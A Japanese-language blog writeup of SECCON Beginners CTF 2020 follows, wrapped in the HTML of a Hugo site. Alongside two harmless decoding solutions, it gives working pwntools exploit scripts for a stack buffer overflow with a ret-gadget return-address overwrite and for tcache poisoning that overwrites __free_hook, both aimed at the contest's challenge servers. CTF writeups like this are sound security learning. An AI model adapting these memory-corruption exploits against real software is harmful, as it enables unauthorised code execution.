@@ -1,0 +1,407 @@
+<!DOCTYPE html>
+<html lang="en-us">
+  <head>
+    <meta charset="utf-8">
+    <meta http-equiv="X-UA-Compatible" content="IE=edge,chrome=1">
+    
+    <title>[writeup] SECCON Begineers CTF 2020 | tamaron</title>
+    <meta name="viewport" content="width=device-width,minimum-scale=1">
+    <meta name="description" content="">
+    <meta name="generator" content="Hugo 0.79.1" />
+    
+    
+    
+    
+      <meta name="robots" content="noindex, nofollow">
+    
+
+    
+<link rel="stylesheet" href="/hugo-page/ananke/css/main.min.css" >
+
+
+
+  
+
+    
+    
+    
+      
+
+    
+
+    
+    
+    <meta property="og:title" content="[writeup] SECCON Begineers CTF 2020" />
+<meta property="og:description" content="" />
+<meta property="og:type" content="article" />
+<meta property="og:url" content="https://www.tamaron.dev/hugo-page/post/2020-05-24/" />
+<meta property="article:published_time" content="2020-05-24T00:00:00+09:00" />
+<meta property="article:modified_time" content="2020-05-24T00:00:00+09:00" /><meta property="og:site_name" content="tamaron" />
+<meta itemprop="name" content="[writeup] SECCON Begineers CTF 2020">
+<meta itemprop="description" content="">
+<meta itemprop="datePublished" content="2020-05-24T00:00:00+09:00" />
+<meta itemprop="dateModified" content="2020-05-24T00:00:00+09:00" />
+<meta itemprop="wordCount" content="195">
+
+
+
+<meta itemprop="keywords" content="CTF," />
+<meta name="twitter:card" content="summary"/>
+<meta name="twitter:title" content="[writeup] SECCON Begineers CTF 2020"/>
+<meta name="twitter:description" content=""/>
+
+	
+  </head>
+
+  <body class="ma0 avenir bg-near-white">
+
+    
+   
+  
+
+  <header>
+    <div class="bg-black">
+      <nav class="pv3 ph3 ph4-ns" role="navigation">
+  <div class="flex-l justify-between items-center center">
+    <a href="/hugo-page/" class="f3 fw2 hover-white no-underline white-90 dib">
+      
+        tamaron
+      
+    </a>
+    <div class="flex-l items-center">
+      
+
+      
+        <ul class="pl0 mr3">
+          
+          <li class="list f5 f4-ns fw4 dib pr3">
+            <a class="hover-white no-underline white-90" href="/hugo-page/about/" title="About ページ">
+              About
+            </a>
+          </li>
+          
+          <li class="list f5 f4-ns fw4 dib pr3">
+            <a class="hover-white no-underline white-90" href="/hugo-page/post/" title="Post ページ">
+              Post
+            </a>
+          </li>
+          
+          <li class="list f5 f4-ns fw4 dib pr3">
+            <a class="hover-white no-underline white-90" href="/hugo-page/contact/" title="Contact ページ">
+              Contact
+            </a>
+          </li>
+          
+        </ul>
+      
+      
+<div class="ananke-socials">
+  
+    
+    <a href="https://twitter.com/tamaroning" target="_blank" rel="noopener" class="twitter ananke-social-link link-transition stackoverflow link dib z-999 pt3 pt0-l mr1" title="Twitter link" aria-label="follow on Twitter——Opens in a new window">
+      
+        <span class="icon"><svg style="enable-background:new 0 0 67 67;" version="1.1" viewBox="0 0 67 67"  xml:space="preserve" xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink"><path d="M37.167,22.283c-2.619,0.953-4.274,3.411-4.086,6.101  l0.063,1.038l-1.048-0.127c-3.813-0.487-7.145-2.139-9.974-4.915l-1.383-1.377l-0.356,1.017c-0.754,2.267-0.272,4.661,1.299,6.271  c0.838,0.89,0.649,1.017-0.796,0.487c-0.503-0.169-0.943-0.296-0.985-0.233c-0.146,0.149,0.356,2.076,0.754,2.839  c0.545,1.06,1.655,2.097,2.871,2.712l1.027,0.487l-1.215,0.021c-1.173,0-1.215,0.021-1.089,0.467  c0.419,1.377,2.074,2.839,3.918,3.475l1.299,0.444l-1.131,0.678c-1.676,0.976-3.646,1.526-5.616,1.568  C19.775,43.256,19,43.341,19,43.405c0,0.211,2.557,1.397,4.044,1.864c4.463,1.377,9.765,0.783,13.746-1.568  c2.829-1.673,5.657-5,6.978-8.221c0.713-1.716,1.425-4.851,1.425-6.354c0-0.975,0.063-1.102,1.236-2.267  c0.692-0.678,1.341-1.419,1.467-1.631c0.21-0.403,0.188-0.403-0.88-0.043c-1.781,0.636-2.033,0.551-1.152-0.402  c0.649-0.678,1.425-1.907,1.425-2.267c0-0.063-0.314,0.042-0.671,0.233c-0.377,0.212-1.215,0.53-1.844,0.72l-1.131,0.361l-1.027-0.7  c-0.566-0.381-1.361-0.805-1.781-0.932C39.766,21.902,38.131,21.944,37.167,22.283z M33,64C16.432,64,3,50.569,3,34S16.432,4,33,4  s30,13.431,30,30S49.568,64,33,64z" style="fill-rule:evenodd;clip-rule:evenodd;"/></svg>
+</span>
+      
+<span class="new-window"><svg  height="8px"  style="enable-background:new 0 0 1000 1000;" version="1.1" viewBox="0 0 1000 1000"  xml:space="preserve" xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink" >
+<path d="M598 128h298v298h-86v-152l-418 418-60-60 418-418h-152v-86zM810 810v-298h86v298c0 46-40 86-86 86h-596c-48 0-86-40-86-86v-596c0-46 38-86 86-86h298v86h-298v596h596z" style="fill-rule:evenodd;clip-rule:evenodd;"/>
+</svg>
+</span></a>
+  
+    
+    <a href="https://github.com/tamaroning" target="_blank" rel="noopener" class="github ananke-social-link link-transition stackoverflow link dib z-999 pt3 pt0-l mr1" title="GitHub link" aria-label="follow on GitHub——Opens in a new window">
+      
+        <span class="icon"><svg style="enable-background:new 0 0 512 512;" version="1.1" viewBox="0 0 512 512"  xml:space="preserve" xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink" >
+  <path d="M256,32C132.3,32,32,134.8,32,261.7c0,101.5,64.2,187.5,153.2,217.9c11.2,2.1,15.3-5,15.3-11.1   c0-5.5-0.2-19.9-0.3-39.1c-62.3,13.9-75.5-30.8-75.5-30.8c-10.2-26.5-24.9-33.6-24.9-33.6c-20.3-14.3,1.5-14,1.5-14   c22.5,1.6,34.3,23.7,34.3,23.7c20,35.1,52.4,25,65.2,19.1c2-14.8,7.8-25,14.2-30.7c-49.7-5.8-102-25.5-102-113.5   c0-25.1,8.7-45.6,23-61.6c-2.3-5.8-10-29.2,2.2-60.8c0,0,18.8-6.2,61.6,23.5c17.9-5.1,37-7.6,56.1-7.7c19,0.1,38.2,2.6,56.1,7.7   c42.8-29.7,61.5-23.5,61.5-23.5c12.2,31.6,4.5,55,2.2,60.8c14.3,16.1,23,36.6,23,61.6c0,88.2-52.4,107.6-102.3,113.3   c8,7.1,15.2,21.1,15.2,42.5c0,30.7-0.3,55.5-0.3,63c0,6.1,4,13.3,15.4,11C415.9,449.1,480,363.1,480,261.7   C480,134.8,379.7,32,256,32z"/>
+</svg>
+</span>
+      
+<span class="new-window"><svg  height="8px"  style="enable-background:new 0 0 1000 1000;" version="1.1" viewBox="0 0 1000 1000"  xml:space="preserve" xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink" >
+<path d="M598 128h298v298h-86v-152l-418 418-60-60 418-418h-152v-86zM810 810v-298h86v298c0 46-40 86-86 86h-596c-48 0-86-40-86-86v-596c0-46 38-86 86-86h298v86h-298v596h596z" style="fill-rule:evenodd;clip-rule:evenodd;"/>
+</svg>
+</span></a>
+  
+</div>
+
+    </div>
+  </div>
+</nav>
+
+    </div>
+  </header>
+
+
+
+    <main class="pb7" role="main">
+      
+  
+  <article class="flex-l flex-wrap justify-between mw8 center ph3">
+    <header class="mt4 w-100">
+      <aside class="instapaper_ignoref b helvetica tracked">
+          
+        POST
+      </aside>
+      
+
+
+
+
+
+
+
+
+
+
+  <div id="sharing" class="mt3 ananke-socials">
+    
+      
+      <a href="https://twitter.com/share?url=https://www.tamaron.dev/hugo-page/post/2020-05-24/&amp;text=[writeup]%20SECCON%20Begineers%20CTF%202020" class="ananke-social-link twitter no-underline" aria-label="share on Twitter">
+        
+        <span class="icon"> <svg style="enable-background:new 0 0 67 67;" version="1.1" viewBox="0 0 67 67"  xml:space="preserve" xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink"><path d="M37.167,22.283c-2.619,0.953-4.274,3.411-4.086,6.101  l0.063,1.038l-1.048-0.127c-3.813-0.487-7.145-2.139-9.974-4.915l-1.383-1.377l-0.356,1.017c-0.754,2.267-0.272,4.661,1.299,6.271  c0.838,0.89,0.649,1.017-0.796,0.487c-0.503-0.169-0.943-0.296-0.985-0.233c-0.146,0.149,0.356,2.076,0.754,2.839  c0.545,1.06,1.655,2.097,2.871,2.712l1.027,0.487l-1.215,0.021c-1.173,0-1.215,0.021-1.089,0.467  c0.419,1.377,2.074,2.839,3.918,3.475l1.299,0.444l-1.131,0.678c-1.676,0.976-3.646,1.526-5.616,1.568  C19.775,43.256,19,43.341,19,43.405c0,0.211,2.557,1.397,4.044,1.864c4.463,1.377,9.765,0.783,13.746-1.568  c2.829-1.673,5.657-5,6.978-8.221c0.713-1.716,1.425-4.851,1.425-6.354c0-0.975,0.063-1.102,1.236-2.267  c0.692-0.678,1.341-1.419,1.467-1.631c0.21-0.403,0.188-0.403-0.88-0.043c-1.781,0.636-2.033,0.551-1.152-0.402  c0.649-0.678,1.425-1.907,1.425-2.267c0-0.063-0.314,0.042-0.671,0.233c-0.377,0.212-1.215,0.53-1.844,0.72l-1.131,0.361l-1.027-0.7  c-0.566-0.381-1.361-0.805-1.781-0.932C39.766,21.902,38.131,21.944,37.167,22.283z M33,64C16.432,64,3,50.569,3,34S16.432,4,33,4  s30,13.431,30,30S49.568,64,33,64z" style="fill-rule:evenodd;clip-rule:evenodd;"/></svg>
+</span>
+        
+      </a>
+    
+  </div>
+
+
+      <h1 class="f1 athelas mt3 mb1">[writeup] SECCON Begineers CTF 2020</h1>
+      
+      
+      
+      <time class="f6 mv4 dib tracked" datetime="2020-05-24T00:00:00+09:00">May 24, 2020</time>
+      
+
+      
+      
+    </header>
+    <div class="nested-copy-line-height lh-copy serif f4 nested-links mid-gray pr4-l w-two-thirds-l"><p>以下の解けた問題のみwriteupを載せます。<!-- raw HTML omitted --></p>
+<ul>
+<li>[pwn] Beginner&rsquo;s Stack<!-- raw HTML omitted --></li>
+<li>[pwn] Beginner&rsquo;s Heap<!-- raw HTML omitted --></li>
+<li>[crypto] R&amp;B<!-- raw HTML omitted --></li>
+<li>[misc] emoemoencode<!-- raw HTML omitted --></li>
+</ul>
+<h2 id="beginners-stack">Beginner&rsquo;s Stack</h2>
+<p>プログラム実行前後のスタックの状態がダンプされるようになっている。
+リターンアドレスとbufferのオフセットを考えれば</p>
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-python" data-lang="python">payload<span style="color:#f92672">=</span><span style="color:#e6db74">&#39;&#39;</span>
+payload<span style="color:#f92672">+=</span><span style="color:#e6db74">&#39;A&#39;</span><span style="color:#f92672">*</span><span style="color:#ae81ff">8</span><span style="color:#f92672">*</span><span style="color:#ae81ff">5</span>
+payload<span style="color:#f92672">+=</span>p64(<span style="color:#ae81ff">0x00400861</span>)
+</code></pre></div><p>のようなペイロードを送ればよいとわかる。
+しかし、実行してみると、</p>
+<pre><code>Oops! RSP is misaligned!
+Some functions such as `system` use `movaps` instructions in libc-2.27 and later.
+This instruction fails when RSP is not a multiple of 0x10.
+Find a way to align RSP! You're almost there!
+</code></pre><p>と怒られてしまう。
+win呼び出し時にスタックポインターの値が0x10の倍数でないといけないらしい。ここで第一に書き換えるべきリターンアドレスの配置場所は0x00007ffde2cb48f8であるからこれをどうにか8byteずらせばよい。
+retがあれば、
+win呼び出し時のespが8byteだけずらすことが出来る。
+gdb-pedaのropgadgetコマンドを用いてretを探す。</p>
+<pre><code>gdb-peda$ ropgadget
+ret = 0x400626
+popret = 0x400728
+addesp_8 = 0x400623
+</code></pre><p>したがってエクスプロイトコードは以下</p>
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-python" data-lang="python"><span style="color:#f92672">from</span> pwn <span style="color:#f92672">import</span> <span style="color:#f92672">*</span>
+context(os<span style="color:#f92672">=</span><span style="color:#e6db74">&#39;linux&#39;</span>, arch<span style="color:#f92672">=</span><span style="color:#e6db74">&#39;i386&#39;</span>)
+
+p <span style="color:#f92672">=</span> remote(<span style="color:#e6db74">&#39;bs.quals.beginners.seccon.jp&#39;</span>,<span style="color:#ae81ff">9001</span>)
+
+payload<span style="color:#f92672">=</span><span style="color:#e6db74">&#39;&#39;</span>
+payload<span style="color:#f92672">+=</span><span style="color:#e6db74">&#39;A&#39;</span><span style="color:#f92672">*</span><span style="color:#ae81ff">8</span><span style="color:#f92672">*</span><span style="color:#ae81ff">5</span>
+payload<span style="color:#f92672">+=</span>p64(<span style="color:#ae81ff">0x00400626</span>)
+payload<span style="color:#f92672">+=</span>p64(<span style="color:#ae81ff">0x00400861</span>)
+
+p<span style="color:#f92672">.</span>sendline(payload)
+p<span style="color:#f92672">.</span>interactive()
+</code></pre></div><h2 id="beginners-heap">Beginner&rsquo;s Heap</h2>
+<p>heapの動作原理の理解が深まる問題だった。
+作問者様のwriteupがわかりやすかったのでそちらを参考にされたい。
+以下エクスプロイトコードと重要事項のみ書いておきます。</p>
+<ul>
+<li>chunk headerの構造をおさえる</li>
+<li>tcacheはUSEなchunkのfree時にサイズごとに単方向リストに連結する仕組み</li>
+<li>fdはFREEなchunkのwilderness(data本体)を指し示す</li>
+<li>malloc時にmallocされるchunkのfdがリストすなわちtcacheに連結される</li>
+<li>今回はheaderのsizeを偽装することでfree時に別のサイズ用のtcacheに連結させられる</li>
+</ul>
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-python" data-lang="python"><span style="color:#f92672">from</span> pwn <span style="color:#f92672">import</span> <span style="color:#f92672">*</span>
+<span style="color:#f92672">import</span> time
+
+context(os<span style="color:#f92672">=</span><span style="color:#e6db74">&#39;linux&#39;</span>, arch<span style="color:#f92672">=</span><span style="color:#e6db74">&#39;i386&#39;</span>)
+
+p <span style="color:#f92672">=</span> remote(<span style="color:#e6db74">&#39;bh.quals.beginners.seccon.jp&#39;</span>,<span style="color:#ae81ff">9002</span>)
+
+<span style="color:#66d9ef">def</span> <span style="color:#a6e22e">write</span>(s):
+    p<span style="color:#f92672">.</span>sendline(<span style="color:#e6db74">&#34;1&#34;</span>)
+    time<span style="color:#f92672">.</span>sleep(<span style="color:#ae81ff">0.1</span>)
+    p<span style="color:#f92672">.</span>sendline(str(s))
+    time<span style="color:#f92672">.</span>sleep(<span style="color:#ae81ff">0.1</span>)
+
+<span style="color:#66d9ef">def</span> <span style="color:#a6e22e">malloc</span>(s):
+    p<span style="color:#f92672">.</span>sendline(<span style="color:#e6db74">&#34;2&#34;</span>)
+    time<span style="color:#f92672">.</span>sleep(<span style="color:#ae81ff">0.1</span>)
+    p<span style="color:#f92672">.</span>sendline(str(s))
+    time<span style="color:#f92672">.</span>sleep(<span style="color:#ae81ff">0.1</span>)
+
+<span style="color:#66d9ef">def</span> <span style="color:#a6e22e">free</span>():
+    p<span style="color:#f92672">.</span>sendline(<span style="color:#e6db74">&#34;3&#34;</span>)
+    time<span style="color:#f92672">.</span>sleep(<span style="color:#ae81ff">0.1</span>)
+
+p<span style="color:#f92672">.</span>recvuntil(<span style="color:#e6db74">&#34;hook&gt;: &#34;</span>)
+free_hook<span style="color:#f92672">=</span>int(p<span style="color:#f92672">.</span>recv(<span style="color:#ae81ff">14</span>),<span style="color:#ae81ff">16</span>)
+
+p<span style="color:#f92672">.</span>recvuntil(<span style="color:#e6db74">&#34;win&gt;: &#34;</span>)
+win<span style="color:#f92672">=</span>int(p<span style="color:#f92672">.</span>recv(<span style="color:#ae81ff">14</span>),<span style="color:#ae81ff">16</span>)
+
+malloc(<span style="color:#e6db74">&#34;A&#34;</span>)
+free()
+
+payload<span style="color:#f92672">=</span>p64(<span style="color:#ae81ff">0</span>)<span style="color:#f92672">*</span><span style="color:#ae81ff">3</span>
+payload<span style="color:#f92672">+=</span>p64(<span style="color:#ae81ff">0x31</span>)
+payload<span style="color:#f92672">+=</span>p64(free_hook)
+write(payload)
+
+malloc(<span style="color:#e6db74">&#34;A&#34;</span>)
+
+free()
+
+malloc(p64(win))
+
+free()
+
+p<span style="color:#f92672">.</span>interactive()
+</code></pre></div><h2 id="rb">R&amp;B</h2>
+<p>フラグは以下の手順にそってエンコードされる</p>
+<ul>
+<li>rot13でエンコードした後に先頭にRを付す</li>
+<li>base64でエンコードした後に先頭にBを付す</li>
+</ul>
+<p>したがってencoded_flagの先頭がBなので先頭のBを取り除いた文字列をbase64でデコード<!-- raw HTML omitted -->
+→さらに得られた文字列の先頭がBならばさらにbase64でデコード&hellip;<!-- raw HTML omitted -->
+という風にすればよい。</p>
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-python" data-lang="python"><span style="color:#f92672">import</span> base64
+<span style="color:#f92672">import</span> codecs
+
+nexts<span style="color:#f92672">=</span><span style="color:#e6db74">&#39;BQlVrOUllRGxXY2xGNVJuQjRkVFZ5U0VVMGNVZEpiRVpTZVZadmQwOWhTVEIxTkhKTFNWSkdWRUZIUlRGWFUwRklUVlpJTVhGc1NFaDFaVVY1Ukd0Rk1qbDFSM3BuVjFwNGVXVkdWWEZYU0RCTldFZ3dRVmR5VVZOTGNGSjFTMjR6VjBWSE1rMVRXak5KV1hCTGVYZEplR3BzY0VsamJFaGhlV0pGUjFOUFNEQk5Wa1pIVFZaYVVqRm9TbUZqWVhKU2NVaElNM0ZTY25kSU1VWlJUMkZJVWsxV1NESjFhVnBVY0d0R1NIVXhUVEJ4TmsweFYyeEdNVUUxUlRCNVIwa3djVmRNYlVGclJUQXhURVZIVGpWR1ZVOVpja2x4UVZwVVFURkZVblZYYmxOaWFrRktTVlJJWVhsTFJFbFhRVUY0UlZkSk1YRlRiMGcwTlE9PQ==&#39;</span>
+
+<span style="color:#66d9ef">while</span> True:
+    top<span style="color:#f92672">=</span>nexts[<span style="color:#ae81ff">0</span>]
+    encoded_string<span style="color:#f92672">=</span>nexts[<span style="color:#ae81ff">1</span>:]
+
+    <span style="color:#66d9ef">if</span> top<span style="color:#f92672">==</span><span style="color:#e6db74">&#39;B&#39;</span> :
+        nexts<span style="color:#f92672">=</span>base64<span style="color:#f92672">.</span>b64decode(encoded_string<span style="color:#f92672">.</span>encode(<span style="color:#e6db74">&#39;utf-8&#39;</span>))
+    <span style="color:#66d9ef">elif</span> top<span style="color:#f92672">==</span><span style="color:#e6db74">&#39;R&#39;</span> :
+        nexts<span style="color:#f92672">=</span>codecs<span style="color:#f92672">.</span>decode(encoded_string,<span style="color:#e6db74">&#39;rot13&#39;</span>)
+    <span style="color:#66d9ef">else</span> :
+        <span style="color:#66d9ef">break</span>
+
+<span style="color:#66d9ef">print</span>(nexts)
+
+</code></pre></div><h2 id="emoemoencode">emoemoencode</h2>
+<p>問題文↓(❓)</p>
+<pre><code>🍣🍴🍦🌴🍢🍻🍳🍴🍥🍧🍡🍮🌰🍧🍲🍡🍰🍨🍹🍟🍢🍹🍟🍥🍭🌰🌰🌰🌰🌰🌰🍪🍩🍽
+</code></pre><p>ググってもそんなエンコード方式存在しなかった&hellip;。<!-- raw HTML omitted -->
+まず文字コードを何らかの方法で変換していると予測。
+一文字目から順にUnicodeを確認する。</p>
+<pre><code>“🍣” (U+1F363)
+“🍴” (U+1F374) 
+...
+</code></pre><p>これに対し、変換元の文字列はctf4b{~}の形式だろうから</p>
+<pre><code>&quot;c&quot; (U+0063)
+&quot;t&quot; (U+0074)
+...
+</code></pre><p>これより下二桁のみに注目すれば良いとわかる。</p>
+<p>pythonで以下のようなスクリプトを実行すれば良い。</p>
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-python" data-lang="python">s<span style="color:#f92672">=</span><span style="color:#e6db74">&#39;🍣🍴🍦🌴🍢🍻🍳🍴🍥🍧🍡🍮🌰🍧🍲🍡🍰🍨🍹🍟🍢🍹🍟🍥🍭🌰🌰🌰🌰🌰🌰🍪🍩🍽&#39;</span>
+a<span style="color:#f92672">=</span><span style="color:#e6db74">&#34;&#34;</span>
+
+<span style="color:#66d9ef">for</span> t <span style="color:#f92672">in</span> s:
+   a<span style="color:#f92672">+=</span>chr(ord(t)<span style="color:#f92672">%</span><span style="color:#ae81ff">128</span>)
+
+<span style="color:#66d9ef">print</span>(a)
+</code></pre></div><ul class="pa0">
+  
+   <li class="list di">
+     <a href="/hugo-page/tags/ctf/" class="link f5 grow no-underline br-pill ba ph3 pv2 mb2 dib black sans-serif">CTF</a>
+   </li>
+  
+</ul>
+<div class="mt6 instapaper_ignoref">
+      
+      
+      </div>
+    </div>
+
+    <aside class="w-30-l mt6-l"><div class="bg-light-gray pa3 nested-list-reset nested-copy-line-height nested-links">
+    <p class="f5 b mb3">この記事の概要</p>
+      <nav id="TableOfContents">
+  <ul>
+    <li><a href="#beginners-stack">Beginner&rsquo;s Stack</a></li>
+    <li><a href="#beginners-heap">Beginner&rsquo;s Heap</a></li>
+    <li><a href="#rb">R&amp;B</a></li>
+    <li><a href="#emoemoencode">emoemoencode</a></li>
+  </ul>
+</nav>
+  </div>
+
+
+
+
+  <div class="bg-light-gray pa3 nested-list-reset nested-copy-line-height nested-links">
+    <p class="f5 b mb3">関連</p>
+    <ul class="pa0 list">
+	   
+	     <li  class="mb2">
+          <a href="/hugo-page/post/2020-03-30/">[writeup] ROP Emporium (3) Write4</a>
+        </li>
+	    
+    </ul>
+</div>
+
+</aside>
+
+  </article>
+
+    </main>
+    <footer class="bg-black bottom-0 w-100 pa3" role="contentinfo">
+  <div class="flex justify-between">
+  <a class="f4 fw4 hover-white no-underline white-70 dn dib-ns pv2 ph3" href="https://www.tamaron.dev/hugo-page/" >
+    &copy;  tamaron 2022 
+  </a>
+    <div>
+<div class="ananke-socials">
+  
+    
+    <a href="https://twitter.com/tamaroning" target="_blank" rel="noopener" class="twitter ananke-social-link link-transition stackoverflow link dib z-999 pt3 pt0-l mr1" title="Twitter link" aria-label="follow on Twitter——Opens in a new window">
+      
+        <span class="icon"><svg style="enable-background:new 0 0 67 67;" version="1.1" viewBox="0 0 67 67"  xml:space="preserve" xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink"><path d="M37.167,22.283c-2.619,0.953-4.274,3.411-4.086,6.101  l0.063,1.038l-1.048-0.127c-3.813-0.487-7.145-2.139-9.974-4.915l-1.383-1.377l-0.356,1.017c-0.754,2.267-0.272,4.661,1.299,6.271  c0.838,0.89,0.649,1.017-0.796,0.487c-0.503-0.169-0.943-0.296-0.985-0.233c-0.146,0.149,0.356,2.076,0.754,2.839  c0.545,1.06,1.655,2.097,2.871,2.712l1.027,0.487l-1.215,0.021c-1.173,0-1.215,0.021-1.089,0.467  c0.419,1.377,2.074,2.839,3.918,3.475l1.299,0.444l-1.131,0.678c-1.676,0.976-3.646,1.526-5.616,1.568  C19.775,43.256,19,43.341,19,43.405c0,0.211,2.557,1.397,4.044,1.864c4.463,1.377,9.765,0.783,13.746-1.568  c2.829-1.673,5.657-5,6.978-8.221c0.713-1.716,1.425-4.851,1.425-6.354c0-0.975,0.063-1.102,1.236-2.267  c0.692-0.678,1.341-1.419,1.467-1.631c0.21-0.403,0.188-0.403-0.88-0.043c-1.781,0.636-2.033,0.551-1.152-0.402  c0.649-0.678,1.425-1.907,1.425-2.267c0-0.063-0.314,0.042-0.671,0.233c-0.377,0.212-1.215,0.53-1.844,0.72l-1.131,0.361l-1.027-0.7  c-0.566-0.381-1.361-0.805-1.781-0.932C39.766,21.902,38.131,21.944,37.167,22.283z M33,64C16.432,64,3,50.569,3,34S16.432,4,33,4  s30,13.431,30,30S49.568,64,33,64z" style="fill-rule:evenodd;clip-rule:evenodd;"/></svg>
+</span>
+      
+<span class="new-window"><svg  height="8px"  style="enable-background:new 0 0 1000 1000;" version="1.1" viewBox="0 0 1000 1000"  xml:space="preserve" xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink" >
+<path d="M598 128h298v298h-86v-152l-418 418-60-60 418-418h-152v-86zM810 810v-298h86v298c0 46-40 86-86 86h-596c-48 0-86-40-86-86v-596c0-46 38-86 86-86h298v86h-298v596h596z" style="fill-rule:evenodd;clip-rule:evenodd;"/>
+</svg>
+</span></a>
+  
+    
+    <a href="https://github.com/tamaroning" target="_blank" rel="noopener" class="github ananke-social-link link-transition stackoverflow link dib z-999 pt3 pt0-l mr1" title="GitHub link" aria-label="follow on GitHub——Opens in a new window">
+      
+        <span class="icon"><svg style="enable-background:new 0 0 512 512;" version="1.1" viewBox="0 0 512 512"  xml:space="preserve" xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink" >
+  <path d="M256,32C132.3,32,32,134.8,32,261.7c0,101.5,64.2,187.5,153.2,217.9c11.2,2.1,15.3-5,15.3-11.1   c0-5.5-0.2-19.9-0.3-39.1c-62.3,13.9-75.5-30.8-75.5-30.8c-10.2-26.5-24.9-33.6-24.9-33.6c-20.3-14.3,1.5-14,1.5-14   c22.5,1.6,34.3,23.7,34.3,23.7c20,35.1,52.4,25,65.2,19.1c2-14.8,7.8-25,14.2-30.7c-49.7-5.8-102-25.5-102-113.5   c0-25.1,8.7-45.6,23-61.6c-2.3-5.8-10-29.2,2.2-60.8c0,0,18.8-6.2,61.6,23.5c17.9-5.1,37-7.6,56.1-7.7c19,0.1,38.2,2.6,56.1,7.7   c42.8-29.7,61.5-23.5,61.5-23.5c12.2,31.6,4.5,55,2.2,60.8c14.3,16.1,23,36.6,23,61.6c0,88.2-52.4,107.6-102.3,113.3   c8,7.1,15.2,21.1,15.2,42.5c0,30.7-0.3,55.5-0.3,63c0,6.1,4,13.3,15.4,11C415.9,449.1,480,363.1,480,261.7   C480,134.8,379.7,32,256,32z"/>
+</svg>
+</span>
+      
+<span class="new-window"><svg  height="8px"  style="enable-background:new 0 0 1000 1000;" version="1.1" viewBox="0 0 1000 1000"  xml:space="preserve" xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink" >
+<path d="M598 128h298v298h-86v-152l-418 418-60-60 418-418h-152v-86zM810 810v-298h86v298c0 46-40 86-86 86h-596c-48 0-86-40-86-86v-596c0-46 38-86 86-86h298v86h-298v596h596z" style="fill-rule:evenodd;clip-rule:evenodd;"/>
+</svg>
+</span></a>
+  
+</div>
+</div>
+  </div>
+</footer>
+
+  </body>
+</html>
